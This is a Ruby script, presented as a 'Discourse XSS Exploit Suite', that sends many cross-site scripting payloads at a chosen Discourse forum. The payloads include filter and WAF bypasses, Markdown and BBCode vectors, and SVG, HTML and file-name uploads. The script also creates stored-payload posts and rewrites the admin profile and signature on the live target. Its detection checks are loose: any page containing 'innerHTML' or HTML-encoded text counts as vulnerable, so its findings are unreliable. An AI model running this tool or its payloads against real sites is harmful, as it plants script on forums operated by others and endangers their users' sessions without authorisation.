#!/usr/bin/env ruby

# Discourse XSS Exploits
# Comprehensive Cross-Site Scripting testing for Discourse forums
# For educational and authorized testing purposes only
#
# Author: ibrahimsql
# Date: 2025
# Purpose: Educational and authorized penetration testing only
#
# WARNING: Use only on systems you own or have explicit permission to test!

require 'net/http'
require 'uri'
require 'json'
require 'openssl'
require 'base64'
require 'nokogiri'
require 'time'

class DiscourseXSS
  def initialize(target_url, options = {})
    @target_url = target_url.chomp('/')
    @timeout = options[:timeout] || 10
    @proxy = options[:proxy]
    @user_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    @csrf_token = nil
    @session_cookies = {}
    @results = {
      vulnerable: false,
      vulnerabilities: [],
      summary: {
        total_tests: 0,
        successful_tests: 0,
        critical_vulns: 0,
        high_vulns: 0,
        medium_vulns: 0
      }
    }
  end

  def run_all_tests
    puts "ðŸš€ Starting Discourse XSS Testing"
    puts "Target: #{@target_url}"
    puts "=" * 60

    # Get CSRF token
    get_csrf_token

    # Test different XSS vectors
    test_reflected_xss
    test_stored_xss
    test_dom_xss
    test_markdown_xss
    test_bbcode_xss
    test_upload_xss
    test_admin_xss
    test_plugin_xss

    # Print results
    print_results
    save_results

    @results
  end

  private

  def get_csrf_token
    begin
      uri = URI("#{@target_url}/")
      response = make_request(uri)
      
      if response && response.body
        doc = Nokogiri::HTML(response.body)
        csrf_meta = doc.at_css('meta[name="csrf-token"]')
        @csrf_token = csrf_meta['content'] if csrf_meta
        
        # Extract session cookies
        response.get_fields('set-cookie')&.each do |cookie|
          cookie_parts = cookie.split(';')[0].split('=')
          @session_cookies[cookie_parts[0]] = cookie_parts[1] if cookie_parts.length == 2
        end
      end
    rescue => e
      puts "[!] Error getting CSRF token: #{e.message}"
    end
  end

  def test_reflected_xss
    puts "[*] Testing reflected XSS vulnerabilities..."
    
    xss_payloads = [
      # Basic XSS
      "<script>alert('XSS')</script>",
      "<img src=x onerror=alert('XSS')>",
      "<svg onload=alert('XSS')>",
      "<iframe src=javascript:alert('XSS')></iframe>",
      "<body onload=alert('XSS')>",
      
      # Event handlers
      "<input onfocus=alert('XSS') autofocus>",
      "<select onfocus=alert('XSS') autofocus>",
      "<textarea onfocus=alert('XSS') autofocus>",
      "<keygen onfocus=alert('XSS') autofocus>",
      "<video><source onerror=alert('XSS')>",
      
      # Filter bypass
      "<ScRiPt>alert('XSS')</ScRiPt>",
      "<script>alert(String.fromCharCode(88,83,83))</script>",
      "<script>alert(/XSS/)</script>",
      "<script>alert`XSS`</script>",
      "<script>eval('alert(\"XSS\")')</script>",
      
      # HTML5 vectors
      "<details open ontoggle=alert('XSS')>",
      "<marquee onstart=alert('XSS')>",
      "<audio src=x onerror=alert('XSS')>",
      "<video src=x onerror=alert('XSS')>",
      "<source src=x onerror=alert('XSS')>",
      
      # CSS injection
      "<style>@import'javascript:alert(\"XSS\")';</style>",
      "<link rel=stylesheet href=javascript:alert('XSS')>",
      "<style>body{background:url(javascript:alert('XSS'))}</style>",
      
      # Data URI
      "<iframe src=data:text/html,<script>alert('XSS')</script>></iframe>",
      "<object data=data:text/html,<script>alert('XSS')</script>></object>",
      
      # Protocol handlers
      "<a href=javascript:alert('XSS')>Click</a>",
      "<form action=javascript:alert('XSS')><input type=submit>",
      
      # Encoded payloads
      "&lt;script&gt;alert('XSS')&lt;/script&gt;",
      "%3Cscript%3Ealert('XSS')%3C/script%3E",
      "\u003cscript\u003ealert('XSS')\u003c/script\u003e",
      
      # WAF bypass
      "<script>alert(String.fromCharCode(88)+String.fromCharCode(83)+String.fromCharCode(83))</script>",
      "<script>window['alert']('XSS')</script>",
      "<script>top['alert']('XSS')</script>",
      "<script>parent['alert']('XSS')</script>"
    ]

    reflection_endpoints = [
      '/search',
      '/u/',
      '/users/',
      '/c/',
      '/t/',
      '/admin/users',
      '/admin/logs',
      '/user_avatar/',
      '/posts',
      '/categories'
    ]
    
    reflection_endpoints.each do |endpoint|
      xss_payloads.each do |payload|
        test_xss_endpoint(endpoint, 'q', payload, 'reflected')
        sleep(0.3)
      end
    end
  end

  def test_stored_xss
    puts "[*] Testing stored XSS vulnerabilities..."
    
    stored_payloads = [
      # Post content XSS
      "<script>alert('Stored XSS in post')</script>",
      "<img src=x onerror=alert('Stored XSS')>",
      "[img]javascript:alert('XSS')[/img]",
      
      # Profile XSS
      "<script>alert('Profile XSS')</script>",
      "<svg onload=alert('Profile XSS')>",
      
      # Signature XSS
      "<iframe src=javascript:alert('Signature XSS')></iframe>",
      
      # Custom field XSS
      "<details open ontoggle=alert('Custom field XSS')>",
      
      # Bio/About XSS
      "<marquee onstart=alert('Bio XSS')>",
      
      # Location XSS
      "<audio src=x onerror=alert('Location XSS')>"
    ]

    # Test post creation
    test_stored_post_xss(stored_payloads)
    
    # Test profile updates
    test_stored_profile_xss(stored_payloads)
    
    # Test signature updates
    test_stored_signature_xss(stored_payloads)
  end

  def test_dom_xss
    puts "[*] Testing DOM-based XSS vulnerabilities..."
    
    dom_payloads = [
      # Hash-based XSS
      "#<script>alert('DOM XSS')</script>",
      "#<img src=x onerror=alert('DOM XSS')>",
      
      # Fragment identifier XSS
      "#javascript:alert('DOM XSS')",
      
      # PostMessage XSS
      "<script>window.postMessage('<img src=x onerror=alert(\"DOM XSS\")>','*')</script>",
      
      # Location manipulation
      "<script>location.hash='<img src=x onerror=alert(\"DOM XSS\")>'</script>"
    ]

    dom_endpoints = [
      '/',
      '/search',
      '/t/test-topic/1',
      '/u/admin'
    ]
    
    dom_endpoints.each do |endpoint|
      dom_payloads.each do |payload|
        test_dom_xss_endpoint(endpoint, payload)
        sleep(0.3)
      end
    end
  end

  def test_markdown_xss
    puts "[*] Testing Markdown XSS vulnerabilities..."
    
    markdown_payloads = [
      # Link XSS
      "[Click me](javascript:alert('Markdown XSS'))",
      "[XSS](data:text/html,<script>alert('XSS')</script>)",
      
      # Image XSS
      "![XSS](javascript:alert('Image XSS'))",
      "![XSS](data:image/svg+xml,<svg onload=alert('XSS')>)",
      
      # HTML in Markdown
      "<script>alert('HTML in Markdown')</script>",
      "<img src=x onerror=alert('HTML XSS')>",
      
      # Reference links
      "[XSS][1]\n[1]: javascript:alert('Reference XSS')",
      
      # Code block escape
      "```\n</code><script>alert('Code escape')</script><code>\n```",
      
      # Table XSS
      "| Header | XSS |\n|--------|-----|\n| Cell | <script>alert('Table XSS')</script> |"
    ]

    # Test in post creation
    markdown_payloads.each do |payload|
      test_markdown_post(payload)
      sleep(0.5)
    end
  end

  def test_bbcode_xss
    puts "[*] Testing BBCode XSS vulnerabilities..."
    
    bbcode_payloads = [
      # URL BBCode
      "[url=javascript:alert('BBCode XSS')]Click me[/url]",
      "[url=data:text/html,<script>alert('XSS')</script>]XSS[/url]",
      
      # Image BBCode
      "[img]javascript:alert('Image XSS')[/img]",
      "[img]data:image/svg+xml,<svg onload=alert('XSS')>[/img]",
      
      # Color BBCode
      "[color=red onmouseover=alert('XSS')]Text[/color]",
      
      # Size BBCode
      "[size=12 onload=alert('XSS')]Text[/size]",
      
      # Quote BBCode
      "[quote=\"onmouseover=alert('XSS')\"]Text[/quote]",
      
      # Code BBCode escape
      "[code]</code><script>alert('BBCode escape')</script><code>[/code]"
    ]

    # Test in post creation
    bbcode_payloads.each do |payload|
      test_bbcode_post(payload)
      sleep(0.5)
    end
  end

  def test_upload_xss
    puts "[*] Testing file upload XSS vulnerabilities..."
    
    # Test SVG upload XSS
    svg_payload = <<~SVG
      <?xml version="1.0" standalone="no"?>
      <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
      <svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
        <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
        <script type="text/javascript">
          alert('SVG XSS');
        </script>
      </svg>
    SVG
    
    test_svg_upload(svg_payload)
    
    # Test HTML file upload
    html_payload = "<html><body><script>alert('HTML Upload XSS')</script></body></html>"
    test_html_upload(html_payload)
    
    # Test filename XSS
    filename_payloads = [
      "<script>alert('Filename XSS')</script>.txt",
      "test\"><script>alert('XSS')</script>.txt",
      "test.txt<script>alert('XSS')</script>"
    ]
    
    filename_payloads.each do |filename|
      test_filename_xss(filename)
      sleep(0.5)
    end
  end

  def test_admin_xss
    puts "[*] Testing admin panel XSS vulnerabilities..."
    
    admin_payloads = [
      # Site settings XSS
      "<script>alert('Site settings XSS')</script>",
      
      # Custom CSS XSS
      "body:before{content:'<script>alert(\"CSS XSS\")</script>'}",
      
      # Custom header XSS
      "<script>alert('Header XSS')</script>",
      
      # Email template XSS
      "<script>alert('Email template XSS')</script>",
      
      # Badge description XSS
      "<img src=x onerror=alert('Badge XSS')>"
    ]

    admin_endpoints = [
      '/admin/site_settings',
      '/admin/customize',
      '/admin/email',
      '/admin/badges'
    ]
    
    admin_endpoints.each do |endpoint|
      admin_payloads.each do |payload|
        test_admin_xss_endpoint(endpoint, payload)
        sleep(0.5)
      end
    end
  end

  def test_plugin_xss
    puts "[*] Testing plugin-specific XSS vulnerabilities..."
    
    plugin_payloads = [
      # Chat plugin XSS
      "<script>alert('Chat XSS')</script>",
      
      # Poll plugin XSS
      "[poll]\n<script>alert('Poll XSS')</script>\n[/poll]",
      
      # Math plugin XSS
      "$$<script>alert('Math XSS')</script>$$",
      
      # Calendar plugin XSS
      "[calendar]<script>alert('Calendar XSS')</script>[/calendar]",
      
      # Checklist plugin XSS
      "- [ ] <script>alert('Checklist XSS')</script>"
    ]

    plugin_endpoints = [
      '/chat',
      '/polls',
      '/calendar'
    ]
    
    plugin_endpoints.each do |endpoint|
      plugin_payloads.each do |payload|
        test_plugin_xss_endpoint(endpoint, payload)
        sleep(0.5)
      end
    end
  end

  def test_xss_endpoint(endpoint, param, payload, test_type)
    begin
      @results[:summary][:total_tests] += 1
      
      # Test GET request
      test_url = "#{@target_url}#{endpoint}?#{param}=#{URI.encode_www_form_component(payload)}"
      response = make_request(URI(test_url))
      
      if response && check_xss_reflection(response, payload)
        vulnerability = {
          type: 'Cross-Site Scripting (XSS)',
          severity: determine_xss_severity(payload, test_type),
          endpoint: endpoint,
          parameter: param,
          payload: payload,
          method: 'GET',
          test_type: test_type,
          evidence: extract_xss_evidence(response, payload),
          timestamp: Time.now.iso8601
        }
        
        @results[:vulnerable] = true
        @results[:vulnerabilities] << vulnerability
        @results[:summary][:successful_tests] += 1
        
        case vulnerability[:severity]
        when 'Critical'
          @results[:summary][:critical_vulns] += 1
        when 'High'
          @results[:summary][:high_vulns] += 1
        when 'Medium'
          @results[:summary][:medium_vulns] += 1
        end
        
        puts "[+] XSS found: #{endpoint} (#{test_type})"
      end
      
    rescue => e
      puts "[!] Error testing #{endpoint}: #{e.message}"
    end
  end

  def test_stored_post_xss(payloads)
    payloads.each do |payload|
      begin
        # Create a new post with XSS payload
        post_data = {
          'title' => 'Test Post',
          'raw' => payload,
          'category' => '1',
          'archetype' => 'regular'
        }
        
        response = make_post_request("#{@target_url}/posts", post_data)
        
        if response && response.code.to_i == 200
          # Check if the post was created and contains our payload
          post_response = JSON.parse(response.body) rescue nil
          if post_response && post_response['id']
            # Verify XSS in the created post
            verify_stored_xss(post_response['id'], payload, 'stored_post')
          end
        end
        
      rescue => e
        # Continue testing
      end
      
      sleep(1)
    end
  end

  def test_stored_profile_xss(payloads)
    payloads.each do |payload|
      begin
        # Update profile with XSS payload
        profile_data = {
          'name' => payload,
          'bio_raw' => payload,
          'location' => payload,
          'website' => payload
        }
        
        response = make_put_request("#{@target_url}/u/admin", profile_data)
        
        if response && response.code.to_i == 200
          # Verify XSS in profile
          verify_stored_xss('admin', payload, 'stored_profile')
        end
        
      rescue => e
        # Continue testing
      end
      
      sleep(1)
    end
  end

  def test_stored_signature_xss(payloads)
    payloads.each do |payload|
      begin
        # Update signature with XSS payload
        signature_data = {
          'user_option[signature]' => payload
        }
        
        response = make_put_request("#{@target_url}/u/admin/preferences", signature_data)
        
        if response && response.code.to_i == 200
          # Verify XSS in signature
          verify_stored_xss('admin', payload, 'stored_signature')
        end
        
      rescue => e
        # Continue testing
      end
      
      sleep(1)
    end
  end

  def test_dom_xss_endpoint(endpoint, payload)
    begin
      @results[:summary][:total_tests] += 1
      
      test_url = "#{@target_url}#{endpoint}#{payload}"
      response = make_request(URI(test_url))
      
      if response && check_dom_xss_potential(response, payload)
        vulnerability = {
          type: 'DOM-based XSS',
          severity: 'High',
          endpoint: endpoint,
          payload: payload,
          method: 'GET',
          test_type: 'dom',
          evidence: extract_dom_xss_evidence(response, payload),
          timestamp: Time.now.iso8601
        }
        
        @results[:vulnerable] = true
        @results[:vulnerabilities] << vulnerability
        @results[:summary][:successful_tests] += 1
        @results[:summary][:high_vulns] += 1
        
        puts "[+] DOM XSS potential found: #{endpoint}"
      end
      
    rescue => e
      # Continue testing
    end
  end

  def test_markdown_post(payload)
    begin
      post_data = {
        'title' => 'Markdown Test',
        'raw' => payload,
        'category' => '1'
      }
      
      response = make_post_request("#{@target_url}/posts", post_data)
      
      if response && response.code.to_i == 200
        post_response = JSON.parse(response.body) rescue nil
        if post_response && post_response['id']
          verify_stored_xss(post_response['id'], payload, 'markdown')
        end
      end
      
    rescue => e
      # Continue testing
    end
  end

  def test_bbcode_post(payload)
    begin
      post_data = {
        'title' => 'BBCode Test',
        'raw' => payload,
        'category' => '1'
      }
      
      response = make_post_request("#{@target_url}/posts", post_data)
      
      if response && response.code.to_i == 200
        post_response = JSON.parse(response.body) rescue nil
        if post_response && post_response['id']
          verify_stored_xss(post_response['id'], payload, 'bbcode')
        end
      end
      
    rescue => e
      # Continue testing
    end
  end

  def test_svg_upload(svg_content)
    begin
      # Create multipart form data for file upload
      boundary = "----WebKitFormBoundary#{rand(1000000000)}"
      
      form_data = "--#{boundary}\r\n"
      form_data += "Content-Disposition: form-data; name=\"file\"; filename=\"test.svg\"\r\n"
      form_data += "Content-Type: image/svg+xml\r\n\r\n"
      form_data += svg_content
      form_data += "\r\n--#{boundary}--\r\n"
      
      headers = {
        'Content-Type' => "multipart/form-data; boundary=#{boundary}",
        'X-CSRF-Token' => @csrf_token || ''
      }
      
      response = make_request(URI("#{@target_url}/uploads"), 'POST', form_data, headers)
      
      if response && check_upload_xss_success(response, 'svg')
        vulnerability = {
          type: 'File Upload XSS',
          severity: 'High',
          endpoint: '/uploads',
          payload: 'SVG with embedded JavaScript',
          method: 'POST',
          test_type: 'upload',
          evidence: ['SVG file uploaded with XSS payload'],
          timestamp: Time.now.iso8601
        }
        
        @results[:vulnerable] = true
        @results[:vulnerabilities] << vulnerability
        @results[:summary][:successful_tests] += 1
        @results[:summary][:high_vulns] += 1
        
        puts "[+] SVG upload XSS found"
      end
      
    rescue => e
      # Continue testing
    end
  end

  def test_html_upload(html_content)
    begin
      boundary = "----WebKitFormBoundary#{rand(1000000000)}"
      
      form_data = "--#{boundary}\r\n"
      form_data += "Content-Disposition: form-data; name=\"file\"; filename=\"test.html\"\r\n"
      form_data += "Content-Type: text/html\r\n\r\n"
      form_data += html_content
      form_data += "\r\n--#{boundary}--\r\n"
      
      headers = {
        'Content-Type' => "multipart/form-data; boundary=#{boundary}",
        'X-CSRF-Token' => @csrf_token || ''
      }
      
      response = make_request(URI("#{@target_url}/uploads"), 'POST', form_data, headers)
      
      if response && check_upload_xss_success(response, 'html')
        vulnerability = {
          type: 'File Upload XSS',
          severity: 'Critical',
          endpoint: '/uploads',
          payload: 'HTML file with JavaScript',
          method: 'POST',
          test_type: 'upload',
          evidence: ['HTML file uploaded with XSS payload'],
          timestamp: Time.now.iso8601
        }
        
        @results[:vulnerable] = true
        @results[:vulnerabilities] << vulnerability
        @results[:summary][:successful_tests] += 1
        @results[:summary][:critical_vulns] += 1
        
        puts "[+] HTML upload XSS found"
      end
      
    rescue => e
      # Continue testing
    end
  end

  def test_filename_xss(filename)
    begin
      boundary = "----WebKitFormBoundary#{rand(1000000000)}"
      
      form_data = "--#{boundary}\r\n"
      form_data += "Content-Disposition: form-data; name=\"file\"; filename=\"#{filename}\"\r\n"
      form_data += "Content-Type: text/plain\r\n\r\n"
      form_data += "Test content"
      form_data += "\r\n--#{boundary}--\r\n"
      
      headers = {
        'Content-Type' => "multipart/form-data; boundary=#{boundary}",
        'X-CSRF-Token' => @csrf_token || ''
      }
      
      response = make_request(URI("#{@target_url}/uploads"), 'POST', form_data, headers)
      
      if response && check_filename_xss_reflection(response, filename)
        vulnerability = {
          type: 'Filename XSS',
          severity: 'Medium',
          endpoint: '/uploads',
          payload: filename,
          method: 'POST',
          test_type: 'filename',
          evidence: ['Filename reflected in response'],
          timestamp: Time.now.iso8601
        }
        
        @results[:vulnerable] = true
        @results[:vulnerabilities] << vulnerability
        @results[:summary][:successful_tests] += 1
        @results[:summary][:medium_vulns] += 1
        
        puts "[+] Filename XSS found: #{filename}"
      end
      
    rescue => e
      # Continue testing
    end
  end

  def test_admin_xss_endpoint(endpoint, payload)
    begin
      @results[:summary][:total_tests] += 1
      
      # Test various admin parameters
      admin_params = ['value', 'content', 'description', 'name', 'title']
      
      admin_params.each do |param|
        test_url = "#{@target_url}#{endpoint}?#{param}=#{URI.encode_www_form_component(payload)}"
        response = make_request(URI(test_url))
        
        if response && check_xss_reflection(response, payload)
          vulnerability = {
            type: 'Admin Panel XSS',
            severity: 'Critical',
            endpoint: endpoint,
            parameter: param,
            payload: payload,
            method: 'GET',
            test_type: 'admin',
            evidence: extract_xss_evidence(response, payload),
            timestamp: Time.now.iso8601
          }
          
          @results[:vulnerable] = true
          @results[:vulnerabilities] << vulnerability
          @results[:summary][:successful_tests] += 1
          @results[:summary][:critical_vulns] += 1
          
          puts "[+] Admin XSS found: #{endpoint} (#{param})"
        end
      end
      
    rescue => e
      # Continue testing
    end
  end

  def test_plugin_xss_endpoint(endpoint, payload)
    begin
      @results[:summary][:total_tests] += 1
      
      response = make_request(URI("#{@target_url}#{endpoint}"))
      
      if response
        # Test POST with plugin-specific payload
        plugin_data = {
          'content' => payload,
          'message' => payload,
          'text' => payload
        }
        
        post_response = make_post_request("#{@target_url}#{endpoint}", plugin_data)
        
        if post_response && check_xss_reflection(post_response, payload)
          vulnerability = {
            type: 'Plugin XSS',
            severity: 'High',
            endpoint: endpoint,
            payload: payload,
            method: 'POST',
            test_type: 'plugin',
            evidence: extract_xss_evidence(post_response, payload),
            timestamp: Time.now.iso8601
          }
          
          @results[:vulnerable] = true
          @results[:vulnerabilities] << vulnerability
          @results[:summary][:successful_tests] += 1
          @results[:summary][:high_vulns] += 1
          
          puts "[+] Plugin XSS found: #{endpoint}"
        end
      end
      
    rescue => e
      # Continue testing
    end
  end

  def verify_stored_xss(post_id, payload, test_type)
    begin
      # Check if the stored payload is reflected in the post
      post_url = "#{@target_url}/t/#{post_id}"
      response = make_request(URI(post_url))
      
      if response && check_xss_reflection(response, payload)
        vulnerability = {
          type: 'Stored XSS',
          severity: 'Critical',
          endpoint: "/t/#{post_id}",
          payload: payload,
          method: 'GET',
          test_type: test_type,
          evidence: extract_xss_evidence(response, payload),
          timestamp: Time.now.iso8601
        }
        
        @results[:vulnerable] = true
        @results[:vulnerabilities] << vulnerability
        @results[:summary][:successful_tests] += 1
        @results[:summary][:critical_vulns] += 1
        
        puts "[+] Stored XSS found: #{test_type}"
      end
      
    rescue => e
      # Continue testing
    end
  end

  def check_xss_reflection(response, payload)
    return false unless response && response.body
    
    content = response.body
    
    # Check for direct payload reflection
    return true if content.include?(payload)
    
    # Check for HTML-encoded reflection
    encoded_payload = payload.gsub('<', '&lt;').gsub('>', '&gt;').gsub('"', '&quot;')
    return true if content.include?(encoded_payload)
    
    # Check for URL-encoded reflection
    url_encoded = URI.encode_www_form_component(payload)
    return true if content.include?(url_encoded)
    
    # Check for JavaScript execution context
    js_contexts = [
      "var data = '#{payload}'",
      "\"#{payload}\"",
      "'#{payload}'",
      "innerHTML = '#{payload}'"
    ]
    
    js_contexts.each do |context|
      return true if content.include?(context)
    end
    
    false
  end

  def check_dom_xss_potential(response, payload)
    return false unless response && response.body
    
    content = response.body
    
    # Check for DOM manipulation functions
    dom_functions = [
      'innerHTML', 'outerHTML', 'document.write', 'document.writeln',
      'eval(', 'setTimeout(', 'setInterval(', 'Function(',
      'location.hash', 'location.search', 'location.href'
    ]
    
    dom_functions.each do |func|
      return true if content.include?(func)
    end
    
    # Check for hash/fragment usage
    return true if content.include?('location.hash') || content.include?('window.location.hash')
    
    false
  end

  def check_upload_xss_success(response, file_type)
    return false unless response
    
    # Check if upload was successful
    return true if response.code.to_i == 200 && response.body.include?('upload_id')
    
    # Check for file type acceptance
    case file_type
    when 'svg'
      return true if response.body.include?('image/svg') || response.body.include?('.svg')
    when 'html'
      return true if response.body.include?('text/html') || response.body.include?('.html')
    end
    
    false
  end

  def check_filename_xss_reflection(response, filename)
    return false unless response && response.body
    
    # Check if filename is reflected in response
    response.body.include?(filename)
  end

  def determine_xss_severity(payload, test_type)
    case test_type
    when 'stored', 'admin'
      'Critical'
    when 'reflected', 'dom', 'plugin'
      'High'
    when 'filename', 'markdown', 'bbcode'
      'Medium'
    else
      'Medium'
    end
  end

  def extract_xss_evidence(response, payload)
    evidence = []
    content = response.body
    
    # Find payload reflection context
    payload_index = content.index(payload)
    if payload_index
      start_index = [payload_index - 50, 0].max
      end_index = [payload_index + payload.length + 50, content.length].min
      context = content[start_index..end_index]
      evidence << "Payload reflected in: #{context.strip}"
    end
    
    # Check for script tags
    if content.include?('<script')
      evidence << "Script tags present in response"
    end
    
    # Check for event handlers
    event_handlers = ['onload', 'onerror', 'onclick', 'onmouseover', 'onfocus']
    event_handlers.each do |handler|
      if content.include?(handler)
        evidence << "Event handler found: #{handler}"
      end
    end
    
    evidence
  end

  def extract_dom_xss_evidence(response, payload)
    evidence = []
    content = response.body
    
    # Check for DOM manipulation
    if content.include?('innerHTML') || content.include?('outerHTML')
      evidence << "DOM manipulation functions present"
    end
    
    # Check for location usage
    if content.include?('location.hash') || content.include?('location.search')
      evidence << "Location object manipulation detected"
    end
    
    # Check for eval usage
    if content.include?('eval(') || content.include?('Function(')
      evidence << "Dynamic code execution functions present"
    end
    
    evidence
  end

  def make_request(uri, method = 'GET', body = nil, headers = {})
    http = Net::HTTP.new(uri.host, uri.port)
    http.use_ssl = uri.scheme == 'https'
    http.verify_mode = OpenSSL::SSL::VERIFY_NONE
    http.read_timeout = @timeout
    
    # Set up proxy if provided
    if @proxy
      proxy_uri = URI(@proxy)
      http = Net::HTTP.new(uri.host, uri.port, proxy_uri.host, proxy_uri.port)
    end
    
    request = case method.upcase
              when 'GET'
                Net::HTTP::Get.new(uri)
              when 'POST'
                Net::HTTP::Post.new(uri)
              when 'PUT'
                Net::HTTP::Put.new(uri)
              else
                Net::HTTP::Get.new(uri)
              end
    
    # Set headers
    request['User-Agent'] = @user_agent
    request['Accept'] = 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
    request['Accept-Language'] = 'en-US,en;q=0.9'
    
    # Add session cookies
    if !@session_cookies.empty?
      cookie_string = @session_cookies.map { |k, v| "#{k}=#{v}" }.join('; ')
      request['Cookie'] = cookie_string
    end
    
    # Add custom headers
    headers.each { |k, v| request[k] = v }
    
    # Set body for POST/PUT requests
    if body && ['POST', 'PUT'].include?(method.upcase)
      request.body = body
      request['Content-Type'] = 'application/x-www-form-urlencoded' unless headers['Content-Type']
    end
    
    begin
      response = http.request(request)
      
      # Update session cookies
      response.get_fields('set-cookie')&.each do |cookie|
        cookie_parts = cookie.split(';')[0].split('=')
        @session_cookies[cookie_parts[0]] = cookie_parts[1] if cookie_parts.length == 2
      end
      
      response
    rescue => e
      puts "[!] Request failed: #{e.message}"
      nil
    end
  end

  def make_post_request(url, form_data)
    uri = URI(url)
    body = URI.encode_www_form(form_data)
    
    make_request(uri, 'POST', body, {
      'X-CSRF-Token' => @csrf_token || '',
      'X-Requested-With' => 'XMLHttpRequest'
    })
  end

  def make_put_request(url, form_data)
    uri = URI(url)
    body = URI.encode_www_form(form_data)
    
    make_request(uri, 'PUT', body, {
      'X-CSRF-Token' => @csrf_token || '',
      'X-Requested-With' => 'XMLHttpRequest'
    })
  end

  def print_results
    puts "\n" + "=" * 60
    puts "DISCOURSE XSS TEST RESULTS"
    puts "=" * 60
    puts "Target: #{@target_url}"
    puts "Vulnerable: #{@results[:vulnerable] ? 'YES' : 'NO'}"
    puts "Total Tests: #{@results[:summary][:total_tests]}"
    puts "Successful Tests: #{@results[:summary][:successful_tests]}"
    puts "Critical Vulnerabilities: #{@results[:summary][:critical_vulns]}"
    puts "High Vulnerabilities: #{@results[:summary][:high_vulns]}"
    puts "Medium Vulnerabilities: #{@results[:summary][:medium_vulns]}"
    
    if @results[:vulnerabilities].any?
      puts "\nVulnerabilities Found:"
      @results[:vulnerabilities].each_with_index do |vuln, index|
        puts "  #{index + 1}. #{vuln[:severity]} - #{vuln[:endpoint]} (#{vuln[:test_type]})"
        puts "     Payload: #{vuln[:payload][0..80]}..."
        puts "     Method: #{vuln[:method]}"
        puts "     Evidence: #{vuln[:evidence].join(', ')}" if vuln[:evidence].any?
      end
    end
  end

  def save_results
    filename = 'discourse_xss_results.json'
    File.write(filename, JSON.pretty_generate(@results))
    puts "\n[*] Results saved to #{filename}"
  end
end

# Main execution
if __FILE__ == $0
  require 'optparse'
  
  options = {}
  OptionParser.new do |opts|
    opts.banner = "Discourse XSS Exploit Suite\n\n"
    opts.banner += "Usage: ruby discourse_xss.rb [options] TARGET_URL\n\n"
    
    opts.on('--proxy PROXY', 'Proxy URL (e.g., http://127.0.0.1:8080)') do |proxy|
      options[:proxy] = proxy
    end
    
    opts.on('--timeout TIMEOUT', Integer, 'Request timeout (default: 10)') do |timeout|
      options[:timeout] = timeout
    end
    
    opts.on('-h', '--help', 'Show this help') do
      puts opts
      puts "\nExample:"
      puts "  ruby discourse_xss.rb https://discourse.example.com"
      puts "\nWARNING: Use only on systems you own or have explicit permission to test!"
      exit
    end
  end.parse!
  
  if ARGV.empty?
    puts "Error: Target URL required"
    puts "Use --help for usage information"
    exit 1
  end
  
  target_url = ARGV[0]
  
  begin
    exploit = DiscourseXSS.new(target_url, options)
    results = exploit.run_all_tests
    
    if results[:vulnerable]
      puts "\nðŸš¨ CRITICAL: XSS vulnerabilities found!"
      puts "   JavaScript execution and session hijacking possible!"
    else
      puts "\nâœ… No XSS vulnerabilities detected"
    end
    
  rescue Interrupt
    puts "\n[!] Testing interrupted by user"
  rescue => e
    puts "\n[!] Testing failed: #{e.message}"
  end
end